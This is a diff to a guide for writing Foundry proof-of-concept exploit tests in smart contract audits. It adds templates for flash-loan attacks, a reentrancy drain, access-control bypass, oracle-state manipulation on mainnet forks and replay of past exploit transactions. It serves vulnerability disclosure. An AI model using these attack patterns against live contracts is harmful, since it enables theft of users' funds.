@@ -215,31 +215,29 @@ function testExploit_attacker_cannot_profit() external {
 For `flash_loan_attack_search` or `sandwich_attack_search` CEs:
 
 ```solidity
-function testExploit_flash_loan_attack() external {
-    address attacker = makeAddr("attacker");
+// NOTE: In a flash loan attack, the TEST CONTRACT itself is the attacker.
+// Do NOT use vm.startPrank() — the callback comes to address(this),
+// and tokens land in address(this). Let the test contract act directly.
 
-    // CE: 3 steps in same block
-    vm.startPrank(attacker);
+function testExploit_flash_loan_attack() external {
+    uint256 balanceBefore = token.balanceOf(address(this));
 
     // Step 1: Flash loan (from CE e_borrow)
+    // The test contract IS the borrower — no prank needed
     flashLoanProvider.flashLoan(
-        address(this),
+        address(this),       // borrower = this contract
         address(token),
-        1000000e18,  // CE: borrow_amount
-        ""
+        1000000e18,          // CE: borrow_amount
+        ""                   // data passed to callback
     );
-    // Inside callback:
-    //   Step 2: Attack (from CE f called with args)
-    //   vault.withdraw(2000000e18);
-    //   Step 3: Repay flash loan
 
-    vm.stopPrank();
-
-    // Verify profit after flash loan repaid
-    assertGt(token.balanceOf(attacker), 0, "Flash loan attack profitable");
+    // Verify profit after flash loan fully repaid
+    uint256 profit = token.balanceOf(address(this)) - balanceBefore;
+    console2.log("Flash loan profit:", profit);
+    assertGt(profit, 0, "Flash loan attack profitable");
 }
 
-// Flash loan callback
+// Flash loan callback — called by the flash loan provider on address(this)
 function onFlashLoan(
     address initiator,
     address tkn,
@@ -247,12 +245,14 @@ function onFlashLoan(
     uint256 fee,
     bytes calldata
 ) external returns (bytes32) {
+    require(initiator == address(this), "Unexpected initiator");
+
     // Step 2: CE attack function with CE args
     IERC20(tkn).approve(address(vault), type(uint256).max);
     vault.deposit(amount);
     vault.withdraw(amount * 2);  // CE argument
 
-    // Step 3: Repay
+    // Step 3: Repay flash loan + fee
     IERC20(tkn).approve(msg.sender, amount + fee);
     return keccak256("ERC3156FlashBorrower.onFlashLoan");
 }
@@ -319,13 +319,33 @@ function testFinding() public {
 
 ## Quick Decision: What Type of Bug?
 
-Before writing code, answer one question:
+Before writing code, walk through this decision tree:
 
-**Does the attacker extract value (tokens/ETH)?**
-- **Yes** → Write a **Value Extraction PoC**
-- **No** → Write an **Invariant Break PoC** (unauthorized execution)
+```
+1. Does the attacker extract value (tokens/ETH)?
+   ├─ YES → Template 1 (Value Extraction)
+   │   ├─ Direct theft (withdraw more than deposited)
+   │   ├─ Price manipulation (oracle, AMM sandwich)
+   │   ├─ Flash loan profit
+   │   └─ Fee/reward abuse
+   │
+   └─ NO → Does the attacker cause permanent harm without extracting funds?
+       ├─ YES → Template 2 (Invariant Break)
+       │   ├─ Access control bypass (call admin/restricted functions)
+       │   ├─ Forced liquidation of solvent positions
+       │   ├─ Permanent DoS / griefing (freeze withdrawals, block upgrades)
+       │   ├─ Fund locking (user cannot withdraw forever)
+       │   ├─ State corruption (break storage invariants, poison oracles)
+       │   └─ Governance hijack (pass unauthorized proposals)
+       │
+       └─ NO → Not a vulnerability (or needs stronger impact argument)
+```
 
-That's it. Don't overthink it.
+**Edge cases:**
+- **Fund locking** (users can't withdraw): Use Template 2 — the invariant is "users can always withdraw their own funds." `_computeImpact()` returns the locked amount.
+- **Cross-chain bugs**: Use Template 1 or 2 on the affected chain. Fork the chain where the exploit matters and demonstrate impact there.
+- **DoS that costs the attacker money**: Use Template 1 if the victim's loss exceeds attacker's cost; otherwise Template 2 focused on the denial of service itself.
+- **Governance manipulation**: Use Template 2. The invariant is the governance threshold / timelock / quorum that was bypassed.
 
 ---
 
@@ -344,8 +364,9 @@ import "forge-std/console2.sol";
 
 import {VulnerableContract} from "src/VulnerableContract.sol";
 import {IERC20} from "src/interfaces/IERC20.sol";
-import {...}
-import {...}
+// Add any additional imports your exploit requires:
+// import {IUniswapV2Router} from "src/interfaces/IUniswapV2Router.sol";
+// import {IPool} from "src/interfaces/IPool.sol";
 /**
  * @title ExploitPoC
  *
@@ -379,9 +400,11 @@ contract ExploitTest is Test {
 
     address constant MAINNET_TOKEN = 0x...;
     address constant MAINNET_VAULT = 0x...;
-    uint256 constant FORK_BLOCK = 19_500_000;
 
-    bool internal snapshotted;
+    // Choose a block where the vulnerable state exists.
+    // Find a block by timestamp: `cast find-block --timestamp <unix_ts> --rpc-url $RPC`
+    // Or pick the latest stable block from a block explorer.
+    uint256 constant FORK_BLOCK = 19_500_000;
 
     struct BalanceSnapshot {
         address token;           // Asset being tracked (ERC20, LP token, etc.)
@@ -391,6 +414,11 @@ contract ExploitTest is Test {
 
     BalanceSnapshot[] internal snapshots;
 
+    // ETH tracking (for exploits that extract native ETH)
+    bool internal ethSnapshotTaken;
+    uint256 internal attackerEthBefore;
+    uint256 internal victimEthBefore;
+
     function setUp() public {
         vm.createSelectFork(vm.envString("MAINNET_RPC_URL"), FORK_BLOCK);
 
@@ -398,14 +426,29 @@ contract ExploitTest is Test {
         token = IERC20(MAINNET_TOKEN);
 
         attacker = makeAddr("attacker");
+
+        // Set the victim to whoever actually loses funds in this exploit.
+        // Common choices:
+        //   address(target)          — the protocol vault / pool itself
+        //   0xRealUserAddress         — a specific on-chain user (LP, depositor)
+        //   makeAddr("victim")        — a generic user for local deployments
+        //
+        // For fork tests, pick the real address that holds the funds at risk.
+        // For local deployments, deploy a victim position in setUp().
         victim = address(target);
 
         vm.deal(attacker, 10 ether);
 
-        // Seed ONLY the capital required to trigger the exploit
-        address whale = 0x...;
-        vm.prank(whale);
-        token.transfer(attacker, 1_000e18);
+        // Seed ONLY the capital required to trigger the exploit.
+        // Prefer deal() — it works for all ERC20s including fee-on-transfer,
+        // rebasing, and blacklist tokens where whale transfers would fail.
+        deal(address(token), attacker, 1_000e18);
+
+        // Alternative: transfer from whale (only if deal() breaks the token's
+        // internal accounting — e.g., tokens that track per-address state).
+        // address whale = 0x...;
+        // vm.prank(whale);
+        // token.transfer(attacker, 1_000e18);
 
         vm.label(attacker, "Attacker");
         vm.label(address(target), "VulnerableVault");
@@ -425,7 +468,10 @@ contract ExploitTest is Test {
      *  This ensures seed capital is not miscounted as profit.
      */
     function snapshotBalances(address _token) internal {
-        require(!snapshotted, "Snapshot already taken");
+        // Guard against snapshotting the same token twice
+        for (uint256 i = 0; i < snapshots.length; i++) {
+            require(snapshots[i].token != _token, "Token already snapshotted");
+        }
 
         snapshots.push(
             BalanceSnapshot({
@@ -434,8 +480,16 @@ contract ExploitTest is Test {
                 victimBefore: IERC20(_token).balanceOf(victim)
             })
         );
+    }
 
-        snapshotted = true;
+    /**
+     * @notice Records pre-exploit ETH balances.
+     * @dev Use this when the exploit extracts native ETH (not WETH).
+     */
+    function snapshotETH() internal {
+        ethSnapshotTaken = true;
+        attackerEthBefore = attacker.balance;
+        victimEthBefore = victim.balance;
     }
 
     /*//////////////////////////////////////////////////////////////
@@ -443,7 +497,7 @@ contract ExploitTest is Test {
     //////////////////////////////////////////////////////////////*/
 
     function executeExploit() internal {
-        require(snapshotted, "Snapshot not taken");
+        require(snapshots.length > 0, "Snapshot not taken — call snapshotBalances() first");
 
         vm.startPrank(attacker);
 
@@ -477,15 +531,30 @@ contract ExploitTest is Test {
             uint256 victimAfter =
                 IERC20(s.token).balanceOf(victim);
 
-            uint256 profit = attackerAfter - s.attackerBefore;
-            uint256 loss = s.victimBefore - victimAfter;
+            // Use signed arithmetic to avoid underflow revert when
+            // attacker spends one token to gain another.
+            int256 profit = int256(attackerAfter) - int256(s.attackerBefore);
+            int256 loss   = int256(s.victimBefore) - int256(victimAfter);
 
             console2.log("\nToken:", s.token);
-            console2.log("Attacker profit:", profit / 1e18);
-            console2.log("Victim loss:", loss / 1e18);
+            console2.log("Attacker delta (wei):", profit >= 0 ? uint256(profit) : uint256(-profit));
+            console2.log("Victim   delta (wei):", loss >= 0 ? uint256(loss) : uint256(-loss));
 
             if (profit > 0) hasProfit = true;
-            if (loss > 0) victimHarmed = true;
+            if (loss > 0)   victimHarmed = true;
+        }
+
+        // ETH tracking
+        if (ethSnapshotTaken) {
+            int256 ethProfit = int256(attacker.balance) - int256(attackerEthBefore);
+            int256 ethLoss   = int256(victimEthBefore) - int256(victim.balance);
+
+            console2.log("\nETH:");
+            console2.log("Attacker ETH delta (wei):", ethProfit >= 0 ? uint256(ethProfit) : uint256(-ethProfit));
+            console2.log("Victim   ETH delta (wei):", ethLoss >= 0 ? uint256(ethLoss) : uint256(-ethLoss));
+
+            if (ethProfit > 0) hasProfit = true;
+            if (ethLoss > 0)   victimHarmed = true;
         }
 
         require(hasProfit, "PoC: attacker did not profit");
@@ -524,6 +593,87 @@ Examples:
 - Breaking a safety check
 - Permanent DoS or griefing
 
+### `InvariantBreakHarness.sol` — Required Base Contract
+
+Create this file alongside your test. Template 2 inherits from it.
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.19;
+
+import "forge-std/Test.sol";
+import "forge-std/console2.sol";
+
+/**
+ * @title InvariantBreakHarness
+ *
+ * @notice Base contract for PoCs that demonstrate unauthorized-execution
+ *         bugs (access control bypass, broken safety checks, griefing, DoS).
+ *
+ *  Child contracts override three hooks:
+ *    1. _invariantHolds()            — define the property that MUST be true
+ *    2. _executeUnauthorizedAction() — the action that should be impossible
+ *    3. _computeImpact()             — measure the downstream damage
+ *
+ *  Call _assertInvariantBreak() in the test entry point.
+ *  The harness will:
+ *    a. Verify the invariant holds BEFORE the attack
+ *    b. Execute the unauthorized action as the attacker
+ *    c. Verify the invariant is BROKEN after the action
+ *    d. Measure and log the impact
+ */
+abstract contract InvariantBreakHarness is Test {
+    address public attacker;
+    address public victim;
+
+    // ── Hooks — override in child ────────────────────────────
+
+    /// @dev Return true when the protocol invariant is intact.
+    function _invariantHolds() internal view virtual returns (bool);
+
+    /// @dev Execute the action that should be impossible.
+    function _executeUnauthorizedAction() internal virtual;
+
+    /// @dev Quantify downstream damage (e.g., liquidation penalty, lost funds).
+    ///      Return 0 if the impact is non-monetary (pure DoS).
+    function _computeImpact() internal view virtual returns (uint256);
+
+    // ── Orchestration ────────────────────────────────────────
+
+    function _assertInvariantBreak() internal {
+        // 1. Pre-condition: invariant MUST hold before the attack
+        bool holdsBefore = _invariantHolds();
+        assertTrue(holdsBefore, "Pre-condition failed: invariant already broken before attack");
+
+        console2.log("\n=== INVARIANT BREAK PoC ===");
+        console2.log("Invariant holds BEFORE attack: true");
+
+        // 2. Execute the unauthorized action as the attacker
+        vm.startPrank(attacker);
+        _executeUnauthorizedAction();
+        vm.stopPrank();
+
+        // 3. Post-condition: invariant MUST be broken now
+        bool holdsAfter = _invariantHolds();
+        console2.log("Invariant holds AFTER  attack:", holdsAfter ? "true (BUG NOT TRIGGERED)" : "FALSE — BROKEN");
+
+        assertFalse(holdsAfter, "Invariant was NOT broken — unauthorized action had no effect");
+
+        // 4. Measure impact
+        uint256 impact = _computeImpact();
+        console2.log("Impact (wei):", impact);
+
+        if (impact > 0) {
+            console2.log("Impact (ETH-scale):", impact / 1e18);
+        } else {
+            console2.log("Impact is non-monetary (DoS / state corruption)");
+        }
+
+        console2.log("=== END ===\n");
+    }
+}
+```
+
 ### Minimal Working Template
 
 ```solidity
@@ -536,7 +686,9 @@ import {InvariantBreakHarness} from "./InvariantBreakHarness.sol";
 contract InvalidLiquidationTest is InvariantBreakHarness {
     VulnerableContract public target;
 
-// Local PoC
+    // ── CHOOSE ONE setUp() and delete the other ──────────────
+
+    // Option A: Local PoC (fresh deployment)
     function setUp() public {
         attacker = makeAddr("attacker");
         victim = makeAddr("victim");
@@ -554,17 +706,19 @@ contract InvalidLiquidationTest is InvariantBreakHarness {
         vm.label(address(target), "VulnerableProtocol");
     }
 
-// Mainnet PoC (fork)
+    /*
+    // Option B: Mainnet PoC (fork) — uncomment this and DELETE Option A above
     function setUp() public {
-    vm.createSelectFork(vm.envString("MAINNET_RPC_URL"), 19_500_000);
+        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"), 19_500_000);
 
-    attacker = makeAddr("attacker");
-    victim = 0xREAL_USER;
+        attacker = makeAddr("attacker");
+        victim = 0xREAL_USER;
 
-    target = VulnerableContract(0xDEPLOYED_ADDRESS);
+        target = VulnerableContract(0xDEPLOYED_ADDRESS);
 
-    require(target.isSolvent(victim), "Victim not solvent");
+        require(target.isSolvent(victim), "Victim not solvent");
     }
+    */
 
     /*//////////////////////////////////////////////////////////////
                         INVARIANT DEFINITION
@@ -657,16 +811,41 @@ function fundAttackerFromWhale(address token, uint256 amount) internal {
 
 ### Pattern 2: Measure Gas Cost
 
+**Modern approach — `vm.startSnapshotGas` / `vm.stopSnapshotGas` (preferred):**
+
 ```solidity
 function testExploitWithGasTracking() public {
-    uint256 gasBefore = gasleft();
-    
+    // Exclude setUp / seed logic from measurement
+    vm.pauseGasMetering();
+    _seedAttacker();
+    vm.resumeGasMetering();
+
+    // Named gas snapshot — only measures the exploit itself
+    vm.startSnapshotGas("exploit");
+
     vm.prank(attacker);
     target.exploit();
-    
+
+    uint256 gasUsed = vm.stopSnapshotGas();
+    uint256 costWei = gasUsed * 50 gwei;
+
+    console2.log("Gas used:", gasUsed);
+    console2.log("Gas cost (wei, at 50 gwei):", costWei);
+    console2.log("Gas cost (gwei):", costWei / 1 gwei);
+}
+```
+
+**Legacy approach — `gasleft()` (works everywhere):**
+
+```solidity
+function testExploitWithGasTracking_legacy() public {
+    uint256 gasBefore = gasleft();
+
+    vm.prank(attacker);
+    target.exploit();
+
     uint256 gasUsed = gasBefore - gasleft();
-    console.log("Gas used:", gasUsed);
-    console.log("Gas cost (at 50 gwei):", (gasUsed * 50 gwei) / 1e18, "ETH");
+    console2.log("Gas used:", gasUsed);
 }
 ```
 
@@ -690,7 +869,57 @@ function testExploitRequiresTimeDelay() public {
 }
 ```
 
-### Pattern 4: Multi-Transaction Attack
+### Pattern 4: Reentrancy Attack
+
+Reentrancy requires a callback contract. The test contract itself can serve as the attacker:
+
+```solidity
+contract ReentrancyExploitTest is Test {
+    VulnerableContract target;
+    IERC20 token;
+    uint256 reentrancyCount;
+
+    function setUp() public {
+        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"), FORK_BLOCK);
+        target = VulnerableContract(MAINNET_VAULT);
+        token = IERC20(MAINNET_TOKEN);
+
+        // The test contract IS the attacker
+        deal(address(token), address(this), 1e18);
+        token.approve(address(target), type(uint256).max);
+        target.deposit(1e18);
+
+        vm.label(address(target), "VulnerableVault");
+        vm.label(address(token), "Token");
+    }
+
+    function testReentrancy() public {
+        uint256 vaultBefore = token.balanceOf(address(target));
+
+        // Trigger the vulnerable withdraw — this calls back into receive()/fallback()
+        target.withdraw(1e18);
+
+        uint256 vaultAfter = token.balanceOf(address(target));
+        console2.log("Vault drained:", vaultBefore - vaultAfter);
+        console2.log("Attacker gained:", token.balanceOf(address(this)));
+        assertGt(token.balanceOf(address(this)), 1e18, "Reentrancy: extracted more than deposited");
+    }
+
+    // Callback — the reentrancy entry point
+    receive() external payable {
+        if (reentrancyCount < 5 && address(target).balance > 0) {
+            reentrancyCount++;
+            target.withdraw(1e18);
+        }
+    }
+
+    // For ERC-777 / ERC-1155 token callbacks, override the relevant hook:
+    // function tokensReceived(...) external { target.withdraw(...); }
+    // function onERC1155Received(...) external returns (bytes4) { target.withdraw(...); }
+}
+```
+
+### Pattern 5: Multi-Transaction Attack
 
 ```solidity
 function testMultiTxExploit() public {
@@ -698,8 +927,10 @@ function testMultiTxExploit() public {
     vm.prank(attacker);
     target.txStep1();
     
-    // Simulate block advancement (if needed)
+    // Simulate block advancement — advance BOTH block number AND timestamp.
+    // Many protocols use block.timestamp for logic (timelocks, interest, oracles).
     vm.roll(block.number + 1);
+    vm.warp(block.timestamp + 12);  // ~12s per block on mainnet
     
     // Transaction 2: Exploit
     vm.prank(attacker);
@@ -713,6 +944,35 @@ function testMultiTxExploit() public {
     assertGt(token.balanceOf(attacker), initialBalance);
 }
 ```
+
+### Pattern 6: Asserting That a Call Should Revert (But Doesn't)
+
+For invariant-break PoCs, you often need to prove that a call **should** revert but is missing its guard:
+
+```solidity
+function testMissingAccessControl() public {
+    // This call should revert for unauthorized callers — but it doesn't
+    vm.prank(attacker);
+    // vm.expectRevert();  ← If this were here and the call reverted, the test passes.
+    //                       We OMIT it to show the call SUCCEEDS when it shouldn't.
+    target.adminFunction();  // Should revert but doesn't → access control bug
+
+    // Prove the unauthorized state change happened
+    assertTrue(target.adminActionWasExecuted(), "Unauthorized admin action succeeded");
+}
+
+function testShouldRevertButDoesNot() public {
+    // Approach: use try/catch to prove the call succeeds
+    vm.prank(attacker);
+    try target.restrictedFunction() {
+        // If we reach here, the call did not revert — BUG
+        emit log("BUG: restrictedFunction() did not revert for unauthorized caller");
+    } catch {
+        fail("Call reverted as expected — no bug");
+    }
+}
+```
+
 ---
 
 ## Rules for Realistic PoCs
@@ -736,60 +996,144 @@ function testMultiTxExploit() public {
 
 ### Special Case: When `vm.store()` Is OK
 
-Only use `vm.store()` to model **historical state** that could have existed:
+`vm.store()` is acceptable **only on out-of-scope / external dependency contracts** — never on the contract you are proving is vulnerable. If you store on the target, a judge can dismiss the PoC as fabricated state.
+
+**Allowed uses:**
+- Setting state on an **oracle** or **price feed** to model a historical price
+- Setting state on an **external dependency** (another protocol's vault, a timelock) that could have reached that state through normal usage
+- Setting a **non-target** contract's storage to recreate conditions that existed at a past block
+
+**Never allowed:**
+- `vm.store(address(target), ...)` — this is the contract under audit; manipulating its storage invalidates the PoC
+- Storing balances or approvals that bypass the target's own logic
 
 ```solidity
-// ✅ ACCEPTABLE: Modeling past checkpoint that wasn't revalidated
-function testStaleCheckpointExploit() public {
-    // This checkpoint could have been set 30 days ago
-    uint256 oldCheckpoint = block.timestamp - 30 days;
-    
-    // Store it to simulate the past state
+// ✅ ACCEPTABLE: Set state on an OUT-OF-SCOPE oracle to model a past price
+function testStaleOracleExploit() public {
+    // The oracle is external / out of scope — its state is a precondition.
+    // This price was observed on-chain 30 days ago.
+    address oracle = 0x...; // External price feed, NOT the target
+    uint256 stalePrice = 1500e8;
+
     vm.store(
-        address(target),
-        bytes32(uint256(5)), // checkpoint slot
-        bytes32(oldCheckpoint)
+        oracle,              // ← NOT address(target)
+        bytes32(uint256(0)), // price slot
+        bytes32(stalePrice)
     );
-    
-    // Now show the bug: protocol doesn't revalidate this old data
+
+    // Now show the bug: the TARGET doesn't revalidate the stale oracle
     vm.prank(attacker);
-    target.useCheckpoint(); // This shouldn't work but does
-    
-    // Show the harm
-    assertGt(token.balanceOf(attacker), 0);
+    target.borrow(1_000e18); // Under-collateralised because price is stale
+
+    assertGt(token.balanceOf(attacker), 0, "Borrowed with stale oracle data");
 }
+
+// ❌ NEVER: vm.store on the TARGET contract itself
+// vm.store(address(target), ...) — INVALIDATES the PoC
 ```
+
+> **Tip:** Prefer forking at a block where the precondition already exists
+> naturally, so you don't need `vm.store()` at all. Use
+> `cast find-block --timestamp <unix_ts>` to find the right block.
 
 ---
 
 ## Running Your PoC
 
+> **Fork URL note:** If your `setUp()` already calls `vm.createSelectFork()`,
+> you do **not** need `--fork-url` on the command line — it would create a
+> redundant second fork that the test ignores. Only pass `--fork-url` when
+> your test does NOT set up its own fork.
+
+### Verbosity Levels
+
+Choose the right trace depth for your situation:
+
+| Flag | Output | When to Use |
+|------|--------|-------------|
+| (none) | Pass/fail summary only | CI, quick sanity check |
+| `-v` | Test names | Scanning which tests ran |
+| `-vv` | `console2.log` output visible | Verifying your logging shows profit/loss |
+| `-vvv` | Traces for **failing** tests | **First stop for debugging a revert** |
+| `-vvvv` | Traces for **all** tests, including setUp | Verifying call order in passing PoCs |
+| `-vvvvv` | Traces **+ storage changes** | Inspecting state mutations, slot values |
+
 ### Basic Run
 
 ```bash
-# Local deployment
+# Local deployment (no fork in setUp)
 forge test --match-test testExploit -vvv
 
-# Mainnet fork
+# Mainnet fork via CLI (only if setUp does NOT call createSelectFork)
 forge test --match-test testExploit --fork-url $MAINNET_RPC_URL -vvv
+
+# If setUp already calls vm.createSelectFork — just run:
+forge test --match-test testExploit -vvv
 ```
 
 ### With Gas Report
 
 ```bash
-forge test --match-test testExploit --fork-url $MAINNET_RPC_URL --gas-report
+forge test --match-test testExploit --gas-report -vvv
 ```
 
-### Debug Mode (Full Traces)
+To report only specific contracts (reduce noise), add to `foundry.toml`:
 
-```bash
-forge test --match-test testExploit --fork-url $MAINNET_RPC_URL -vvvvv
+```toml
+[profile.default]
+gas_reports = ["VulnerableContract"]
+gas_reports_ignore = ["Test", "Script"]
 ```
 
-### Specific Block
+### Debug Mode (Full Traces + Storage Changes)
 
 ```bash
-forge test --match-test testExploit --fork-url $MAINNET_RPC_URL --fork-block-number 19500000
+# -vvvvv shows storage slot writes — essential for verifying state corruption
+forge test --match-test testExploit -vvvvv
+```
+
+### Interactive Debugger
+
+Step through opcodes to trace the exact exploit path:
+
+```bash
+forge test --debug testExploit
+```
+
+Debugger keys: `n` (next opcode), `s` (step into), `o` (step out), `c` (continue to breakpoint), `q` (quit).
+
+### Specific Block (CLI fork only)
+
+```bash
+# Only needed when NOT using vm.createSelectFork in setUp
+forge test --match-test testExploit --fork-url $MAINNET_RPC_URL --fork-block-number 19500000 -vvv
+```
+
+### Replay a Real On-Chain Transaction
+
+When investigating a past exploit, replay the attacker's actual transaction to see the full trace:
+
+```bash
+# Replay and show full trace of a historical exploit tx
+cast run 0x<txhash> --rpc-url $MAINNET_RPC_URL
+```
+
+This fetches the tx from chain, re-executes it locally, and shows the complete call tree — useful for reverse-engineering an exploit before writing your own PoC.
+
+### Finding Storage Slots for vm.store()
+
+When you need to use `vm.store()` (on out-of-scope contracts only), find the correct slot:
+
+```bash
+# View full storage layout of a contract
+forge inspect VulnerableContract storage-layout
+
+# Compute storage slot for a mapping: mapping(address => uint256) at slot 0
+# slot = keccak256(abi.encode(address, uint256(0)))
+cast index address 0xYourAddress 0
+
+# Read a storage slot on-chain to verify
+cast storage 0xContractAddress 0x<slot> --rpc-url $MAINNET_RPC_URL
 ```
 
 ---
@@ -804,7 +1148,7 @@ Quick checks:
 - [ ] Console logs show before/after state clearly
 - [ ] Reduce Console logs to what is only important for the judger to understand the exploit
 - [ ] Assertions prove the exploit worked
-- [ ] Gas cost is reasonable (<5M gas if possible)
+- [ ] Gas cost is reasonable (under block gas limit of 30M; most exploits should be <10M)
 - [ ] Works on mainnet fork with real addresses or the realistic local deployment
 - [ ] No unnecessary complexity - keep it as simple as possible to demonstrate the bug
 - [ ] Code is minimal - no unnecessary complexity
